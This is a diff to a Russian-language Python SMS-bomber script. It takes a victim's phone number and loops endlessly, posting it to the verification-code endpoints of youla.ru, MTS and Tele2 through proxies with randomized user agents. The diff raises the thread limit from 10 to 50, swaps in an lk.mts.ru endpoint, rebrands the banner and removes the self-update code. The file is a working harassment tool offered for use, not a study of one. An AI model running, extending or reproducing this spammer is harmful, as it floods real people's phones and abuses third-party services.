@@ -13,27 +13,26 @@ from user_agent import generate_user_agent
 def banner():
     system("cls" if name == "nt" else "clear")
     print(BRIGHT + GREEN)
-    print(r"  ___ ___  _   __  __ __  __ ___ ___  ")
-    print(r" / __| _ \/_\ |  \/  |  \/  | __| _ \ ")
-    print(r" \__ \  _/ _ \| |\/| | |\/| | _||   / ")
-    print(r" |___/_|/_/ \_\_|  |_|_|  |_|___|_|_\ ")
-    print()
-    print(r"     Spammer: github.com/cludeex      ")
+    
+    print(f"{GREEN} ⣿⣿⣿⠿⠻⠛⠛⠻⢿⣿      ___ ___  _   __  __ __  __ ___ ___  ")
+    print(f"{GREEN}⣿⣿⠁⠄⠄⠄⠄⠄⠄⠘⣿⣿    / __| _ \/_\ |  \/  |  \/  | __| _ \ ")
+    print(f"{GREEN}⣿⣿⡀⢠⣶⡆⢠⣶⡄⢀⣿⣿    \__ \  _/ _ \| |\/| | |\/| | _||   / ")
+    print(f"{GREEN}⣿⣿⣋⡈⠉⠡⠎⠉⠁⣈⣿⣿    |___/_|/_/ \_\_|  |_|_|  |_|___|_|_\ ")
+    print(f"{GREEN}⢿⣿⣿⡏⢦⣀⣀⣠⢪⣿⣿⡿                                   {RED}by A1Ex@")
+    print(f"{GREEN} ⠙⠿⣷⣌⠉⠉⢁⣾⡿⠟                                           ")                                                     
     print(RESET_ALL)
 
 
 def main():
     banner()
-    print("[1] СМС СПАМЕР.")
-    print("[2] ОБНОВИТЬ СПАМЕР.")
-    print("[3] ВЫХОД.")
     print()
-    number = input(f"{BRIGHT}{BLUE}Введите номер пункта: {RESET_ALL}")
-    if number == "1":
+    print("                          [1] СМС СПАМЕР")
+    print("                            [2] ВЫХОД")
+    print()
+    select = input(f"{BRIGHT}{BLUE}Введите номер пункта: {RESET_ALL}")
+    if select == "1":
         spam_handler()
-    elif number == "2":
-        update()
-    elif number == "3":
+    elif select == "2":
         print()
         exit()
     else:
@@ -44,7 +43,6 @@ def main():
 
 def spam_handler():
     check_internet()
-    check_version()
     banner()
     print("Введите номер телефона")
     phone = parse_phone(input(f"{BRIGHT}{BLUE}spammer >> {RESET_ALL}"))
@@ -61,8 +59,8 @@ def spam_handler():
     if threads in ["", " ", "0"]:
         threads = "1"
     try:
-        if int(threads) > 10:
-            threads = "10"
+        if int(threads) > 50:
+            threads = "50"
     except ValueError:
         threads = "1"
     banner()
@@ -89,18 +87,25 @@ def start_spam(phone, proxies):
     headers = {"User-Agent": generate_user_agent()}
     while True:
     
+#        try:
+#            post("https://youla.ru/web-api/auth/request_code", data={"phone": phone}, headers=headers, proxies=proxies)
+#        except:
+#            pass
+#        try:
+#            post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code", params={"msisdn": phone}, headers=headers, proxies=proxies)
+#        except:
+#           pass
+#        try:
+ #           post(f"https://msk.tele2.ru/api/validation/number/{phone}", json={"sender": "Tele2"}, headers=headers, proxies=proxies)
+#        except:
+#            pass
         try:
-            post("https://youla.ru/web-api/auth/request_code", data={"phone": phone}, headers=headers, proxies=proxies)
+           post(f"https://lk.mts.ru/", data={"value": phone}, headers=headers, proxies=proxies)
         except:
             pass
-        try:
-            post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code", params={"msisdn": phone}, headers=headers, proxies=proxies)
-        except:
-           pass
-        try:
-            post(f"https://msk.tele2.ru/api/validation/number/{phone}", json={"sender": "Tele2"}, headers=headers, proxies=proxies)
-        except:
-            pass
+            
+            
+            
 def parse_phone(phone):
     if phone in ["", " "]:
         main()
@@ -133,35 +138,9 @@ def check_internet():
     return
 
 
-def check_version():
-    version = "3.1"
-    if float(version) < float(get("https://raw.githubusercontent.com/cludeex/spammer/master/version.txt").text):
-        print(f"\n{BRIGHT}{RED}[*] Версия устарела и нуждается в обновлении!{RESET_ALL}")
-        sleep(1)
-        main()
-    return
 
 
-def update():
-    check_internet()
-    banner()
-    print("Вы уверены, что хотите обновить? (y/n)")
-    update = input(f"{BRIGHT}{BLUE}spammer >> {RESET_ALL}")
-    if update.lower() == "y":
-        if exists("/usr/bin") and isfile("/usr/bin/spammer"):
-            file = open("/usr/bin/spammer", "wb")
-        elif exists("/usr/local/bin/") and isfile("/usr/local/bin/spammer"):
-            file = open("/usr/local/bin/spammer", "wb")
-        elif exists("/data/data/com.termux/files/usr/bin") and isfile("/data/data/com.termux/files/usr/bin/spammer"):
-            file = open("/data/data/com.termux/files/usr/bin/spammer", "wb")
-        try:
-            file.write(get("https://raw.githubusercontent.com/cludeex/spammer/master/spammer.py").content)
-            file.close()
-            system("spammer")
-        except UnboundLocalError:
-            system("cd $HOME && rm -rf spammer && git clone https://github.com/cludeex/spammer && cd spammer && sh install.sh")
-    else:
-        main()
+
 
 GREEN = Fore.GREEN
 BLUE = Fore.BLUE
